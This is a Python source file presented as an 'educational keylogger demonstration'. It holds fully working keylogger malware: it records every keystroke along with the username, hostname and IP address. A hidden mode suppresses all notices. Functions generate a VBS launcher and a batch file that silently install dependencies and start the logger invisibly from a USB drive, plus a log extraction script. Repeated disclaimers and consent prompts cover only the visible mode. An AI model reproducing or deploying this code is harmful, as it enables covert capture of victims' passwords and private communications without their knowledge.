"""
Educational Keylogger Demonstration
-----------------------------------
This script demonstrates the basic concepts of keyboard monitoring for educational purposes only.
It captures keyboard inputs and logs them to a text file.

DISCLAIMER:
    This tool is for EDUCATIONAL PURPOSES ONLY.
    Using keyloggers without consent is illegal and unethical.
    Always respect privacy and adhere to applicable laws and regulations.
    The author assumes no liability for misuse of this code.

Requirements:
    - Python 3.6+
    - pynput library (install with: pip install pynput)
    - Windows operating system

Author: For Educational Use Only
"""

import os
import datetime
import logging
import platform
import socket
import getpass
import threading
import time

# Check if pynput is installed, provide helpful message if not
try:
    from pynput import keyboard
except ImportError:
    print("Error: The 'pynput' library is not installed.")
    print("Please install it using: pip install pynput")
    print("\nIf you're preparing this for a USB drive deployment:")
    print("1. Make sure to include the requirements.txt file")
    print("2. Include a batch file that runs: pip install -r requirements.txt")
    exit(1)

# Configure logging
logging.basicConfig(level=logging.INFO, 
                    format='%(asctime)s - %(message)s',
                    datefmt='%Y-%m-%d %H:%M:%S')
logger = logging.getLogger(__name__)

class EducationalKeylogger:
    """
    A basic keylogger implementation for educational demonstration.
    Shows how keyboard monitoring works without any malicious intent.
    """
    
    def __init__(self, log_dir="logs", collect_system_info=True, run_hidden=False):
        """
        Initialize the keylogger.
        
        Args:
            log_dir (str): Directory to store log files
            collect_system_info (bool): Whether to collect basic system information
            run_hidden (bool): For educational purposes - demonstrates how malware might hide itself
        """
        self.log_dir = log_dir
        self.log_file = None
        self.collect_system_info = collect_system_info
        self.run_hidden = run_hidden
        self.special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]\n",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.shift_r: "[SHIFT]",
            keyboard.Key.ctrl: "[CTRL]",
            keyboard.Key.ctrl_r: "[CTRL]",
            keyboard.Key.alt: "[ALT]",
            keyboard.Key.alt_r: "[ALT]",
            keyboard.Key.caps_lock: "[CAPS_LOCK]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.delete: "[DELETE]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
            keyboard.Key.home: "[HOME]",
            keyboard.Key.end: "[END]",
            keyboard.Key.page_up: "[PAGE_UP]",
            keyboard.Key.page_down: "[PAGE_DOWN]",
            keyboard.Key.f1: "[F1]",
            keyboard.Key.f2: "[F2]",
            keyboard.Key.f3: "[F3]",
            keyboard.Key.f4: "[F4]",
            keyboard.Key.f5: "[F5]",
            keyboard.Key.f6: "[F6]",
            keyboard.Key.f7: "[F7]",
            keyboard.Key.f8: "[F8]",
            keyboard.Key.f9: "[F9]",
            keyboard.Key.f10: "[F10]",
            keyboard.Key.f11: "[F11]",
            keyboard.Key.f12: "[F12]",
        }
        
        # Create log directory if it doesn't exist
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
            
        # Create a new log file with timestamp
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = os.path.join(self.log_dir, f"keylog_{timestamp}.txt")
        
        # Write header to log file
        with open(self.log_file, 'a') as f:
            f.write("=== EDUCATIONAL KEYLOGGER DEMONSTRATION ===\n")
            f.write(f"Log started at: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("===========================================\n\n")
            
            # Collect and log system information (for educational purposes)
            if self.collect_system_info:
                self._collect_system_info(f)
                
    def _collect_system_info(self, file_obj):
        """
        Collect and log basic system information.
        
        Args:
            file_obj: The open file object to write to
        """
        file_obj.write("--- SYSTEM INFORMATION ---\n")
        
        try:
            # Operating System Info
            file_obj.write(f"OS: {platform.system()} {platform.release()} {platform.version()}\n")
            file_obj.write(f"Architecture: {platform.machine()}\n")
            
            # User Info
            file_obj.write(f"Username: {getpass.getuser()}\n")
            file_obj.write(f"Computer Name: {platform.node()}\n")
            
            # Network Info
            file_obj.write(f"Hostname: {socket.gethostname()}\n")
            try:
                file_obj.write(f"IP Address: {socket.gethostbyname(socket.gethostname())}\n")
            except:
                file_obj.write("IP Address: Unable to retrieve\n")
                
            # Python Info
            file_obj.write(f"Python Version: {platform.python_version()}\n")
            
        except Exception as e:
            file_obj.write(f"Error collecting system info: {str(e)}\n")
            
        file_obj.write("\n--- START OF KEYSTROKE LOG ---\n\n")
    
    def on_press(self, key):
        """
        Callback function triggered when a key is pressed.
        
        Args:
            key: The key that was pressed
        """
        try:
            # Handle special keys
            if key in self.special_keys:
                char = self.special_keys[key]
            # Handle regular alphanumeric keys
            else:
                char = key.char
                
            # Log the key
            self._write_to_log(char)
            
        except AttributeError:
            # Some special keys may not be mapped
            logger.debug(f"Special key {key} pressed but not mapped")
        except Exception as e:
            logger.error(f"Error processing key: {e}")
    
    def _write_to_log(self, char):
        """
        Write the captured key to the log file.
        
        Args:
            char: The character or key representation to log
        """
        try:
            # Check if log file exists
            if self.log_file is not None:
                with open(self.log_file, 'a') as f:
                    f.write(char)
        except Exception as e:
            logger.error(f"Error writing to log file: {e}")
    
    def start(self):
        """
        Start the keylogger.
        """
        # Initialize the log file if it hasn't been already
        if self.log_file is None:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            self.log_file = os.path.join(self.log_dir, f"keylog_{timestamp}.txt")
            with open(self.log_file, 'a') as f:
                f.write("=== EDUCATIONAL KEYLOGGER DEMONSTRATION ===\n")
                f.write(f"Log started at: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("===========================================\n\n")
                if self.collect_system_info:
                    self._collect_system_info(f)
        
        # If not running in hidden mode, display educational notice
        if not self.run_hidden:
            print("=" * 60)
            print("EDUCATIONAL KEYLOGGER DEMONSTRATION")
            print("=" * 60)
            print("DISCLAIMER: This tool is for EDUCATIONAL PURPOSES ONLY.")
            print("Using keyloggers without consent is illegal and unethical.")
            print("Press Ctrl+C to stop the keylogger demonstration.")
            print(f"Logging keystrokes to: {self.log_file}")
            print("=" * 60)
        
        # Start listening for keyboard events
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        
        try:
            # Keep the program running until Ctrl+C is pressed
            listener.join()
        except KeyboardInterrupt:
            if not self.run_hidden:
                print("\nKeylogger demonstration stopped.")
            # Write footer to log file
            if self.log_file:
                with open(self.log_file, 'a') as f:
                    f.write("\n\n===========================================\n")
                    f.write(f"Log ended at: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        finally:
            # Stop the listener
            listener.stop()
            if not self.run_hidden:
                print(f"Log file saved to: {self.log_file}")
                
    def create_usb_launcher(self, output_dir="."):
        """
        Create launcher files for USB deployment demonstration.
        For educational purposes only.
        
        Args:
            output_dir (str): Directory to save launcher files
        """
        # Create requirements.txt
        with open(os.path.join(output_dir, "requirements.txt"), 'w') as f:
            f.write("pynput>=1.7.6\n")
        
        # Create batch launcher (visible)
        with open(os.path.join(output_dir, "launch_keylogger_demo.bat"), 'w') as f:
            f.write("@echo off\n")
            f.write("echo EDUCATIONAL KEYLOGGER DEMONSTRATION\n")
            f.write("echo DISCLAIMER: For educational purposes only. Misuse is illegal.\n")
            f.write("echo.\n")
            f.write("echo Installing required Python packages...\n")
            f.write("pip install -r requirements.txt\n")
            f.write("echo.\n")
            f.write("echo Starting demonstration...\n")
            f.write("python keylogger.py\n")
            f.write("pause\n")
        
        # Create hidden launcher (for demonstration of stealth techniques)
        with open(os.path.join(output_dir, "hidden_launcher_demo.vbs"), 'w') as f:
            f.write('Set WshShell = CreateObject("WScript.Shell")\n')
            f.write('WshShell.Run chr(34) & "' + os.path.join(output_dir, "stealth_demo.bat") + '" & Chr(34), 0\n')
            f.write('Set WshShell = Nothing\n')
        
        # Create stealth batch file
        with open(os.path.join(output_dir, "stealth_demo.bat"), 'w') as f:
            f.write("@echo off\n")
            f.write("pip install -q -r requirements.txt\n")
            f.write("python -c \"from keylogger import EducationalKeylogger; keylogger = EducationalKeylogger(run_hidden=True); keylogger.start()\"\n")
        
        # Create README file
        with open(os.path.join(output_dir, "USB_DEMO_README.txt"), 'w') as f:
            f.write("=== EDUCATIONAL KEYLOGGER DEMONSTRATION ===\n\n")
            f.write("DISCLAIMER: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY.\n")
            f.write("Using keyloggers without consent is illegal and unethical.\n\n")
            f.write("This demonstration package shows how keyloggers can be deployed\n")
            f.write("via USB drives. Understanding these techniques is important for\n")
            f.write("cybersecurity education and awareness.\n\n")
            f.write("Files included:\n")
            f.write("- keylogger.py - The main Python script\n")
            f.write("- requirements.txt - Python package dependencies\n")
            f.write("- launch_keylogger_demo.bat - Visible launcher (educational)\n")
            f.write("- hidden_launcher_demo.vbs - Hidden launcher (demonstrates stealth techniques)\n")
            f.write("- stealth_demo.bat - Background execution script\n\n")
            f.write("Usage Instructions:\n")
            f.write("1. Ensure Python 3.6+ is installed on the system\n")
            f.write("2. Run 'launch_keylogger_demo.bat' for the visible demonstration\n")
            f.write("3. Logs will be saved in the 'logs' directory\n\n")
            f.write("IMPORTANT: Never use these techniques without explicit permission.\n")
            f.write("Unauthorized use of keyloggers may violate computer crime laws.\n")
            
        print(f"USB deployment demonstration files created in {output_dir}")
        print("These files demonstrate how keyloggers could be deployed via USB drives.")
        print("REMINDER: This is for educational purposes only. Always obtain proper consent.")


def create_usb_package(output_dir="usb_demo"):
    """
    Create a complete USB package for educational demonstration.
    
    Args:
        output_dir (str): Directory to save demonstration files
    """
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    # Create a copy of the keylogger.py file
    with open(__file__, 'r') as source:
        with open(os.path.join(output_dir, "keylogger.py"), 'w') as dest:
            dest.write(source.read())
    
    # Create deployment files
    keylogger = EducationalKeylogger()
    keylogger.create_usb_launcher(output_dir)
    
    # Create a log analyzer tool
    with open(os.path.join(output_dir, "log_analyzer.py"), 'w') as f:
        f.write('''"""
Log Analyzer for Educational Keylogger Demonstration
---------------------------------------------------
This script helps analyze the keylogger logs for educational understanding.
"""

import os
import sys
import datetime
import matplotlib.pyplot as plt
from collections import Counter

def analyze_log(log_file):
    """Analyze a keylogger log file."""
    if not os.path.exists(log_file):
        print(f"Error: Log file '{log_file}' not found.")
        return False
        
    # Read the log file
    with open(log_file, 'r') as f:
        content = f.read()
    
    # Extract metadata
    start_time = "Unknown"
    end_time = "Unknown"
    system_info = {}
    
    # Try to extract start time
    start_time_match = content.find("Log started at: ")
    if start_time_match != -1:
        start_time = content[start_time_match + 15:start_time_match + 34]
    
    # Try to extract end time
    end_time_match = content.find("Log ended at: ")
    if end_time_match != -1:
        end_time = content[end_time_match + 13:end_time_match + 32]
    
    # Try to extract system information
    sys_info_start = content.find("--- SYSTEM INFORMATION ---")
    sys_info_end = content.find("--- START OF KEYSTROKE LOG ---")
    
    if sys_info_start != -1 and sys_info_end != -1:
        sys_info_text = content[sys_info_start + 26:sys_info_end].strip()
        for line in sys_info_text.split('\\n'):
            if ':' in line:
                key, value = line.split(':', 1)
                system_info[key.strip()] = value.strip()
    
    # Find the keystroke log part
    keystroke_start = content.find("--- START OF KEYSTROKE LOG ---")
    if keystroke_start != -1:
        keystroke_log = content[keystroke_start + 30:].strip()
        if content.find("===========================================") != -1:
            keystroke_log = keystroke_log.split("===========================================")[0].strip()
    else:
        # If no marker, assume entire file is keystrokes after header
        header_end = content.find("===========================================")
        if header_end != -1:
            keystroke_log = content[header_end + 45:].strip()
            if "===========================================\\n" in keystroke_log:
                keystroke_log = keystroke_log.split("===========================================\\n")[0].strip()
        else:
            keystroke_log = content
    
    # Analyze the keystrokes
    total_keystrokes = len(keystroke_log.replace("[ENTER]", "").replace("[TAB]", "").replace("[SHIFT]", ""))
    special_keys = 0
    for key in ["[ENTER]", "[TAB]", "[BACKSPACE]", "[SHIFT]", "[CTRL]", "[ALT]", "[CAPS_LOCK]", 
                "[ESC]", "[DELETE]", "[UP]", "[DOWN]", "[LEFT]", "[RIGHT]"]:
        special_keys += keystroke_log.count(key)
    
    # Count character frequencies
    char_count = Counter(keystroke_log.replace("[ENTER]", "").replace("[TAB]", "").replace("[SHIFT]", ""))
    most_common_chars = char_count.most_common(10)
    
    # Print the analysis
    print("\\n=== EDUCATIONAL KEYLOGGER LOG ANALYSIS ===")
    print(f"Log file: {log_file}")
    print(f"Logging period: {start_time} to {end_time}")
    print(f"Total keystrokes: {total_keystrokes}")
    print(f"Special keys used: {special_keys}")
    
    if system_info:
        print("\\nSystem Information:")
        for key, value in system_info.items():
            print(f"  {key}: {value}")
    
    print("\\nMost common characters:")
    for char, count in most_common_chars:
        if char.strip():  # Skip whitespace characters for this display
            print(f"  '{char}': {count} times")
    
    # Create simple visualization
    try:
        plt.figure(figsize=(10, 6))
        chars, counts = zip(*[(c if c.strip() else "SPACE", n) for c, n in most_common_chars[:8]])
        plt.bar(chars, counts)
        plt.title("Most Frequent Keystrokes")
        plt.ylabel("Frequency")
        plt.xlabel("Character")
        plt.tight_layout()
        
        # Save the visualization
        viz_filename = f"{os.path.splitext(log_file)[0]}_analysis.png"
        plt.savefig(viz_filename)
        print(f"\\nVisualization saved as {viz_filename}")
        
    except Exception as e:
        print(f"\\nCould not create visualization: {e}")
    
    return True

if __name__ == "__main__":
    # Display educational notice
    print("=== EDUCATIONAL KEYLOGGER LOG ANALYZER ===")
    print("This tool is for analyzing keylogger logs for educational purposes only.")
    print("It helps understand the patterns and data captured by the keylogger demonstration.")
    print("\\nDISCLAIMER: This tool is part of an educational demonstration.")
    print("Using keyloggers without consent is illegal and unethical.\\n")
    
    # Check for log file argument
    if len(sys.argv) > 1:
        log_file = sys.argv[1]
        analyze_log(log_file)
    else:
        # No argument provided, look for log files
        log_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
        if os.path.exists(log_dir):
            log_files = [f for f in os.listdir(log_dir) if f.startswith("keylog_") and f.endswith(".txt")]
            
            if log_files:
                print(f"Found {len(log_files)} log files in '{log_dir}':")
                for i, log_file in enumerate(log_files):
                    print(f"  {i+1}. {log_file}")
                
                choice = input("\\nEnter the number of the log file to analyze (or 'q' to quit): ")
                if choice.lower() != 'q':
                    try:
                        index = int(choice) - 1
                        if 0 <= index < len(log_files):
                            analyze_log(os.path.join(log_dir, log_files[index]))
                        else:
                            print("Invalid selection.")
                    except ValueError:
                        print("Invalid input. Please enter a number.")
            else:
                print(f"No log files found in '{log_dir}'.")
                print("Run the keylogger demonstration first to generate logs.")
        else:
            print(f"Log directory '{log_dir}' not found.")
            print("Please provide the path to a log file: python log_analyzer.py path/to/logfile.txt")
''')
    
    # Create a log extraction tool
    with open(os.path.join(output_dir, "extract_logs.bat"), 'w') as f:
        f.write("@echo off\n")
        f.write("echo EDUCATIONAL KEYLOGGER LOG EXTRACTOR\n")
        f.write("echo This tool copies logs to a specified location.\n")
        f.write("echo.\n")
        f.write("if not exist logs (\n")
        f.write("    echo No logs directory found.\n")
        f.write("    echo Run the keylogger demonstration first to generate logs.\n")
        f.write("    pause\n")
        f.write("    exit /b\n")
        f.write(")\n")
        f.write("echo Found logs directory.\n")
        f.write("set /p DEST=Enter destination path (e.g., E:\\logs): \n")
        f.write("if not exist \"%DEST%\" mkdir \"%DEST%\"\n")
        f.write("xcopy /y /s logs\\*.* \"%DEST%\"\n")
        f.write("echo.\n")
        f.write("echo Logs copied to %DEST%\n")
        f.write("pause\n")
    
    # Create a documentation file
    with open(os.path.join(output_dir, "DOCUMENTATION.md"), 'w') as f:
        f.write("""# Educational Keylogger Demonstration

## IMPORTANT DISCLAIMER

**THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY**

This project demonstrates the basic concepts of keyboard monitoring for educational and research purposes only. Understanding how keyloggers work is important for cybersecurity education, ethical hacking courses, and personal awareness of privacy threats.

**Using keyloggers without explicit consent is illegal in most jurisdictions and is a violation of privacy. This code should NEVER be used to monitor anyone's activity without their knowledge and consent.**

The author of this code assumes NO LIABILITY for any misuse of this software. By using this code, you accept full responsibility for your actions and agree to use it only in a legal and ethical manner.

## Purpose of This Demonstration

This educational package helps to understand:

1. How keyboard events can be captured at the system level
2. The techniques used by malicious software to gather sensitive information
3. How keyloggers can be distributed via removable media
4. The importance of maintaining computer security

## Package Contents

- `keylogger.py` - Main Python script that demonstrates keystroke logging
- `launch_keylogger_demo.bat` - Visible launcher for the demonstration
- `hidden_launcher_demo.vbs` - Demonstrates stealth launching techniques
- `stealth_demo.bat` - Background execution script
- `requirements.txt` - Python package dependencies
- `log_analyzer.py` - Tool to analyze the captured keystrokes
- `extract_logs.bat` - Utility to extract logs to another location
- `USB_DEMO_README.txt` - Quick-start instructions
- `DOCUMENTATION.md` - This comprehensive documentation

## System Requirements

- Windows operating system (7/8/10/11)
- Python 3.6 or higher installed
- Internet connection (for first-time package installation)

## Step-by-Step Usage Guide

### Standard Educational Demonstration

1. Insert the USB drive containing these files into a Windows computer
2. Navigate to the drive using File Explorer
3. Run `launch_keylogger_demo.bat`
4. When prompted, confirm you understand this is for educational purposes
5. The demonstration will show keystrokes being captured
6. Press Ctrl+C to stop the demonstration
7. Logs will be saved in the `logs` directory

### Understanding the Hidden Launch Demonstration

For educational purposes, this package includes a demonstration of how malicious software might try to hide itself:

1. The `hidden_launcher_demo.vbs` file demonstrates a technique to launch programs without visible windows
2. The `stealth_demo.bat` shows how a program could install dependencies and run silently
3. **DO NOT run these files unless you fully understand their purpose**

### Analyzing the Captured Keystrokes

After running the demonstration:

1. Run `python log_analyzer.py` to analyze captured keystrokes
2. Select the log file you wish to analyze
3. The analyzer will show statistics about the captured data
4. If matplotlib is installed, it will create a visualization of frequent keystrokes

### Extracting Logs

1. To copy logs to another location (e.g., for analysis on another system), run `extract_logs.bat`
2. Enter the destination path when prompted

## Technical Details

This demonstration uses the `pynput` library to monitor keyboard events at a system level. Key features:

- Captures both regular keystrokes and special keys
- Logs the system information at startup
- Creates timestamped log files
- Provides visual feedback during operation (unless in hidden mode)

## Legal and Ethical Considerations

Using keyloggers without consent may violate:
- Computer Fraud and Abuse Act (US)
- Electronic Communications Privacy Act (US)
- Data Protection laws (EU/UK)
- Similar laws in other jurisdictions

Potential legal consequences include:
- Criminal charges
- Civil liability
- Fines and imprisonment

## Protecting Yourself from Real Keyloggers

This educational demonstration highlights why you should:

1. Never insert unknown USB drives into your computer
2. Keep your antivirus software updated
3. Be cautious about what software you install
4. Use two-factor authentication for sensitive accounts
5. Consider using password managers instead of typing sensitive passwords
6. Be wary of phishing attempts that may install malware

## Additional Resources

To learn more about cybersecurity and ethical hacking:

- Cybersecurity courses on platforms like Coursera, Udemy, or edX
- CompTIA Security+ certification materials
- Books on ethical hacking and penetration testing
- National Cybersecurity Alliance (staysafeonline.org)

## License

This educational code is provided under the MIT License, with the explicit restriction that it must only be used for educational and ethical purposes.
""")
    
    print(f"\nUSB demonstration package created in the '{output_dir}' directory")
    print("REMINDER: This package is for educational purposes only.")
    print("Always practice ethical use of security tools and respect privacy.")
    
if __name__ == "__main__":
    print("\nEDUCATIONAL KEYLOGGER DEMONSTRATION")
    print("DISCLAIMER: For educational purposes only. Misuse is illegal.\n")
    
    print("Choose an option:")
    print("1. Run keylogger demonstration")
    print("2. Create USB deployment package")
    print("3. Exit")
    
    choice = input("\nEnter your choice (1-3): ")
    
    if choice == "1":
        consent = input("\nThis program demonstrates how keyloggers work for educational purposes.\n"
                       "Do you understand this is for educational use only and consent to continue? (yes/no): ")
        
        if consent.lower() in ["yes", "y"]:
            keylogger = EducationalKeylogger()
            keylogger.start()
        else:
            print("Demonstration cancelled. Thank you for understanding the ethical implications.")
    
    elif choice == "2":
        consent = input("\nThis will create a full demonstration package that could be deployed via USB.\n"
                       "This is for educational purposes only. Do you understand and consent? (yes/no): ")
        
        if consent.lower() in ["yes", "y"]:
            output_dir = input("\nEnter directory name for the package [default: usb_demo]: ").strip()
            if not output_dir:
                output_dir = "usb_demo"
            create_usb_package(output_dir)
        else:
            print("Package creation cancelled.")
    
    else:
        print("Exiting the demonstration.")
